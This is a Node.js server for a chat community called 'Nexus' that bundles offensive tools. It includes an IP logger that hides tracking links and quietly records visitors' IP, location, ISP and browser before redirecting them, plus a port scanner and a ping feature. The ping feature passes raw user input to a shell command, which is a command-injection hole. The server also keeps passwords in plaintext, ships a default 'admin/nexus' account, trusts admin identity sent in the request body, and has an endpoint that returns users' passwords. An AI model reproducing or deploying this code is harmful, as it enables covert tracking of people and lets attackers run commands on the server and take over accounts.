const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const fs = require('fs');
const net = require('net');
const dns = require('dns');
const { exec } = require('child_process');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// Store active ping sessions
const activePings = new Map();

// Middleware
app.use(express.static(__dirname));
app.use(express.json());

// Database file
const DB_FILE = 'users.json';

// Load or create users database
function loadUsers() {
    try {
        if (fs.existsSync(DB_FILE)) {
            return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
        }
    } catch (e) {
        console.log('Creating new database...');
    }
    // Default users
    const defaultUsers = {
        'admin': {
            username: 'admin',
            password: 'nexus',
            role: 'owner',
            bio: 'System Administrator',
            avatar: '',
            joinDate: new Date().toISOString()
        }
    };
    saveUsers(defaultUsers);
    return defaultUsers;
}

function saveUsers(users) {
    fs.writeFileSync(DB_FILE, JSON.stringify(users, null, 2));
}

let registeredUsers = loadUsers();

// Store connected users (online)
const onlineUsers = new Map();

// API Routes
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    const user = registeredUsers[username];
    
    if (user && user.password === password) {
        res.json({ success: true, user: { ...user, password: undefined } });
    } else {
        res.json({ success: false, message: 'Invalid credentials' });
    }
});

app.post('/api/register', (req, res) => {
    const { username, password } = req.body;
    
    if (registeredUsers[username]) {
        res.json({ success: false, message: 'Username already exists' });
        return;
    }
    
    registeredUsers[username] = {
        username,
        password,
        role: 'member',
        bio: '',
        avatar: '',
        joinDate: new Date().toISOString()
    };
    saveUsers(registeredUsers);
    res.json({ success: true });
});

app.get('/api/members', (req, res) => {
    const members = Object.values(registeredUsers).map(u => ({
        username: u.username,
        role: u.role,
        bio: u.bio,
        avatar: u.avatar,
        joinDate: u.joinDate,
        online: Array.from(onlineUsers.values()).includes(u.username)
    }));
    res.json(members);
});

app.post('/api/profile/update', (req, res) => {
    const { username, bio, avatar, newUsername } = req.body;
    
    if (!registeredUsers[username]) {
        res.json({ success: false, message: 'User not found' });
        return;
    }
    
    const user = registeredUsers[username];
    
    // Update fields
    if (bio !== undefined) user.bio = bio;
    if (avatar !== undefined) user.avatar = avatar;
    
    // Handle username change
    if (newUsername && newUsername !== username) {
        if (registeredUsers[newUsername]) {
            res.json({ success: false, message: 'Username already taken' });
            return;
        }
        user.username = newUsername;
        registeredUsers[newUsername] = user;
        delete registeredUsers[username];
    }
    
    saveUsers(registeredUsers);
    res.json({ success: true, user: { ...user, password: undefined } });
});

// Kick user (remove from online, they can rejoin)
app.post('/api/member/kick', (req, res) => {
    const { adminUser, targetUser } = req.body;
    const admin = registeredUsers[adminUser];
    
    if (!admin || (admin.role !== 'owner' && admin.role !== 'admin')) {
        res.json({ success: false, message: 'No permission' });
        return;
    }
    
    // Find and disconnect user
    for (const [id, name] of onlineUsers.entries()) {
        if (name === targetUser) {
            io.to(id).emit('kicked', 'You have been kicked');
            onlineUsers.delete(id);
        }
    }
    io.emit('userList', Array.from(new Set(onlineUsers.values())));
    res.json({ success: true });
});

// Ban user (delete account)
app.post('/api/member/ban', (req, res) => {
    const { adminUser, targetUser } = req.body;
    const admin = registeredUsers[adminUser];
    const target = registeredUsers[targetUser];
    
    if (!admin || (admin.role !== 'owner' && admin.role !== 'admin')) {
        res.json({ success: false, message: 'No permission' });
        return;
    }
    
    if (!target) {
        res.json({ success: false, message: 'User not found' });
        return;
    }
    
    if (target.role === 'owner') {
        res.json({ success: false, message: 'Cannot ban owner' });
        return;
    }
    
    // Kick from online
    for (const [id, name] of onlineUsers.entries()) {
        if (name === targetUser) {
            io.to(id).emit('banned', 'You have been banned');
            onlineUsers.delete(id);
        }
    }
    
    // Delete account
    delete registeredUsers[targetUser];
    saveUsers(registeredUsers);
    io.emit('userList', Array.from(new Set(onlineUsers.values())));
    res.json({ success: true });
});

// Promote/demote user
app.post('/api/member/role', (req, res) => {
    const { adminUser, targetUser, newRole } = req.body;
    const admin = registeredUsers[adminUser];
    const target = registeredUsers[targetUser];
    
    if (!admin || admin.role !== 'owner') {
        res.json({ success: false, message: 'Only owner can change roles' });
        return;
    }
    
    if (!target) {
        res.json({ success: false, message: 'User not found' });
        return;
    }
    
    if (target.role === 'owner') {
        res.json({ success: false, message: 'Cannot change owner role' });
        return;
    }
    
    target.role = newRole;
    saveUsers(registeredUsers);
    res.json({ success: true });
});

// Get user credentials (for recovery - owner/admin only)
app.post('/api/member/credentials', (req, res) => {
    const { adminUser, targetUser } = req.body;
    const admin = registeredUsers[adminUser];
    const target = registeredUsers[targetUser];
    
    if (!admin || (admin.role !== 'owner' && admin.role !== 'admin')) {
        res.json({ success: false, message: 'No permission' });
        return;
    }
    
    if (!target) {
        res.json({ success: false, message: 'User not found' });
        return;
    }
    
    res.json({ 
        success: true, 
        username: target.username,
        password: target.password,
        role: target.role
    });
});

// ============ IP LOGGER ============
const IPLOG_FILE = 'iplogs.json';

function loadIPLogs() {
    try {
        if (fs.existsSync(IPLOG_FILE)) {
            return JSON.parse(fs.readFileSync(IPLOG_FILE, 'utf8'));
        }
    } catch (e) {}
    return {};
}

function saveIPLogs(logs) {
    fs.writeFileSync(IPLOG_FILE, JSON.stringify(logs, null, 2));
}

let ipLogs = loadIPLogs();

// Create new tracking link
app.post('/api/iplogger/create', (req, res) => {
    const { owner, redirectUrl, customSlug } = req.body;
    
    // Use custom slug or generate random
    let trackId = customSlug ? customSlug.toLowerCase().replace(/[^a-z0-9-]/g, '') : '';
    if (!trackId || ipLogs[trackId]) {
        trackId = Math.random().toString(36).substring(2, 10);
    }
    
    ipLogs[trackId] = {
        owner,
        redirectUrl: redirectUrl || 'https://google.com',
        created: new Date().toISOString(),
        logs: []
    };
    saveIPLogs(ipLogs);
    
    res.json({ 
        success: true, 
        trackId,
        trackUrl: `/t/${trackId}`
    });
});

// Get logs for a tracking link
app.get('/api/iplogger/logs/:trackId', (req, res) => {
    const { trackId } = req.params;
    const log = ipLogs[trackId];
    
    if (!log) {
        res.json({ success: false, message: 'Link not found' });
        return;
    }
    
    res.json({ success: true, data: log });
});

// Get all links for a user
app.get('/api/iplogger/mylinks/:username', (req, res) => {
    const { username } = req.params;
    const userLinks = [];
    
    for (const [trackId, data] of Object.entries(ipLogs)) {
        if (data.owner === username) {
            userLinks.push({ trackId, ...data });
        }
    }
    
    res.json(userLinks);
});

// Delete a tracking link
app.delete('/api/iplogger/delete/:trackId', (req, res) => {
    const { trackId } = req.params;
    
    if (ipLogs[trackId]) {
        delete ipLogs[trackId];
        saveIPLogs(ipLogs);
        res.json({ success: true });
    } else {
        res.json({ success: false, message: 'Link not found' });
    }
});

// Tracking endpoint - captures IP when visited
app.get('/t/:trackId', async (req, res) => {
    const { trackId } = req.params;
    const log = ipLogs[trackId];
    
    if (!log) {
        res.status(404).send('Not found');
        return;
    }
    
    // Get visitor IP - try multiple headers
    let ip = req.headers['x-forwarded-for'] ||
             req.headers['x-real-ip'] ||
             req.headers['cf-connecting-ip'] ||
             req.connection?.remoteAddress ||
             req.socket?.remoteAddress ||
             'Unknown';
    
    // Clean IP
    if (ip.includes(',')) ip = ip.split(',')[0].trim();
    ip = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    
    // Get IP info from API
    let ipInfo = { ip: ip };
    try {
        // Skip localhost IPs
        if (ip !== '127.0.0.1' && ip !== 'localhost' && !ip.startsWith('192.168.') && !ip.startsWith('10.')) {
            const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
            const data = await response.json();
            if (data.status === 'success') {
                ipInfo = {
                    ip: data.query || ip,
                    country: data.country,
                    countryCode: data.countryCode,
                    region: data.regionName,
                    city: data.city,
                    zip: data.zip,
                    lat: data.lat,
                    lon: data.lon,
                    timezone: data.timezone,
                    isp: data.isp,
                    org: data.org,
                    as: data.as
                };
            }
        } else {
            ipInfo = { ip: ip, country: 'Localhost', city: 'Local', isp: 'Local Network' };
        }
    } catch (e) {
        console.log('IP API error:', e.message);
    }
    
    // Save log with more info
    log.logs.push({
        ...ipInfo,
        userAgent: req.headers['user-agent'],
        referer: req.headers['referer'] || 'Direct',
        language: req.headers['accept-language']?.split(',')[0] || 'Unknown',
        timestamp: new Date().toISOString()
    });
    saveIPLogs(ipLogs);
    
    // Notify via socket
    io.emit('iplog', { trackId, log: log.logs[log.logs.length - 1] });
    
    // Redirect
    res.redirect(log.redirectUrl);
});
// ============ END IP LOGGER ============

// ============ PORT SCANNER ============
app.post('/api/portscan', async (req, res) => {
    const { target, ports } = req.body;
    
    if (!target || !ports || !Array.isArray(ports)) {
        res.json({ success: false, message: 'Invalid parameters' });
        return;
    }

    // Resolve hostname to IP if needed
    let ip = target;
    try {
        if (!/^\d{1,3}(\.\d{1,3}){3}$/.test(target)) {
            ip = await new Promise((resolve, reject) => {
                dns.lookup(target, (err, address) => {
                    if (err) reject(err);
                    else resolve(address);
                });
            });
        }
    } catch (e) {
        res.json({ success: false, message: 'Could not resolve hostname' });
        return;
    }

    const results = [];
    const scanPromises = ports.map(port => {
        return new Promise((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(2000);

            socket.on('connect', () => {
                results.push({ port, status: 'open', service: getServiceName(port) });
                socket.destroy();
                resolve();
            });

            socket.on('timeout', () => {
                results.push({ port, status: 'filtered', service: getServiceName(port) });
                socket.destroy();
                resolve();
            });

            socket.on('error', () => {
                results.push({ port, status: 'closed', service: getServiceName(port) });
                socket.destroy();
                resolve();
            });

            socket.connect(port, ip);
        });
    });

    await Promise.all(scanPromises);
    results.sort((a, b) => a.port - b.port);
    res.json({ success: true, target: ip, results });
});

function getServiceName(port) {
    const services = {
        20: 'FTP-DATA', 21: 'FTP', 22: 'SSH', 23: 'TELNET', 25: 'SMTP',
        53: 'DNS', 80: 'HTTP', 110: 'POP3', 119: 'NNTP', 123: 'NTP',
        143: 'IMAP', 161: 'SNMP', 194: 'IRC', 443: 'HTTPS', 445: 'SMB',
        465: 'SMTPS', 587: 'SMTP', 993: 'IMAPS', 995: 'POP3S',
        1433: 'MSSQL', 1521: 'ORACLE', 3306: 'MYSQL', 3389: 'RDP',
        5432: 'POSTGRESQL', 5900: 'VNC', 6379: 'REDIS', 8080: 'HTTP-PROXY',
        8443: 'HTTPS-ALT', 27017: 'MONGODB'
    };
    return services[port] || 'UNKNOWN';
}

// ============ REAL PINGER ============
app.post('/api/ping/start', (req, res) => {
    const { target, sessionId } = req.body;
    
    if (!target || !sessionId) {
        res.json({ success: false, message: 'Invalid parameters' });
        return;
    }

    // Stop existing ping for this session
    if (activePings.has(sessionId)) {
        clearInterval(activePings.get(sessionId));
    }

    const isWindows = process.platform === 'win32';
    const pingCmd = isWindows ? `ping -n 1 -w 2000 ${target}` : `ping -c 1 -W 2 ${target}`;

    const pingInterval = setInterval(() => {
        exec(pingCmd, (error, stdout) => {
            let result = { target, online: false, time: null, ttl: null };
            
            if (!error && stdout) {
                // Parse ping output
                const timeMatch = stdout.match(/time[=<](\d+)/i);
                const ttlMatch = stdout.match(/ttl[=](\d+)/i);
                
                if (timeMatch) {
                    result.online = true;
                    result.time = parseInt(timeMatch[1]);
                    result.ttl = ttlMatch ? parseInt(ttlMatch[1]) : null;
                }
            }
            
            io.to(sessionId).emit('pingResult', result);
        });
    }, 1000);

    activePings.set(sessionId, pingInterval);
    res.json({ success: true });
});

app.post('/api/ping/stop', (req, res) => {
    const { sessionId } = req.body;
    
    if (activePings.has(sessionId)) {
        clearInterval(activePings.get(sessionId));
        activePings.delete(sessionId);
    }
    
    res.json({ success: true });
});

// ============ CHAT PINNED MESSAGES ============
let pinnedMessage = null;
let pinnedTimeout = null;

app.post('/api/chat/pin', (req, res) => {
    const { username, message, duration } = req.body;
    const user = registeredUsers[username];
    
    if (!user || (user.role !== 'owner' && user.role !== 'admin')) {
        res.json({ success: false, message: 'No permission' });
        return;
    }

    // Clear existing pin timeout
    if (pinnedTimeout) {
        clearTimeout(pinnedTimeout);
    }

    pinnedMessage = {
        text: message,
        pinnedBy: username,
        pinnedAt: new Date().toISOString(),
        duration: duration
    };

    // Auto-unpin after duration (if not permanent)
    if (duration > 0) {
        pinnedTimeout = setTimeout(() => {
            pinnedMessage = null;
            io.emit('pinnedMessage', null);
        }, duration * 60 * 1000); // duration in minutes
    }

    io.emit('pinnedMessage', pinnedMessage);
    res.json({ success: true });
});

app.post('/api/chat/unpin', (req, res) => {
    const { username } = req.body;
    const user = registeredUsers[username];
    
    if (!user || (user.role !== 'owner' && user.role !== 'admin')) {
        res.json({ success: false, message: 'No permission' });
        return;
    }

    if (pinnedTimeout) {
        clearTimeout(pinnedTimeout);
    }
    pinnedMessage = null;
    io.emit('pinnedMessage', null);
    res.json({ success: true });
});

app.get('/api/chat/pinned', (req, res) => {
    res.json(pinnedMessage);
});

// Socket.io for chat
io.on('connection', (socket) => {
    console.log('User connected:', socket.id);

    socket.on('join', (username) => {
        // Remove any existing connection with same username (prevent duplicates)
        for (const [id, name] of onlineUsers.entries()) {
            if (name === username && id !== socket.id) {
                onlineUsers.delete(id);
            }
        }
        onlineUsers.set(socket.id, username);
        io.emit('userList', Array.from(new Set(onlineUsers.values())));
        io.emit('message', {
            type: 'system',
            text: `${username} joined the chat`,
            time: new Date().toLocaleTimeString()
        });
        
        // Send current pinned message to new user
        if (pinnedMessage) {
            socket.emit('pinnedMessage', pinnedMessage);
        }
    });

    // Join ping session room
    socket.on('joinPingSession', (sessionId) => {
        socket.join(sessionId);
    });

    socket.on('leavePingSession', (sessionId) => {
        socket.leave(sessionId);
    });

    socket.on('chatMessage', (msg) => {
        const username = onlineUsers.get(socket.id) || 'Anonymous';
        
        // Handle different message types
        if (msg.type === 'image') {
            io.emit('message', {
                type: 'image',
                username: username,
                content: msg.content,
                time: new Date().toLocaleTimeString()
            });
        } else {
            io.emit('message', {
                type: 'text',
                username: username,
                text: msg.content || msg,
                time: new Date().toLocaleTimeString()
            });
        }
    });

    socket.on('disconnect', () => {
        const username = onlineUsers.get(socket.id);
        if (username) {
            onlineUsers.delete(socket.id);
            // Only show leave message if user is not connected elsewhere
            const stillOnline = Array.from(onlineUsers.values()).includes(username);
            if (!stillOnline) {
                io.emit('message', {
                    type: 'system',
                    text: `${username} left the chat`,
                    time: new Date().toLocaleTimeString()
                });
            }
            io.emit('userList', Array.from(new Set(onlineUsers.values())));
        }
        console.log('User disconnected:', socket.id);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Nexus Server running on port ${PORT}`);
});
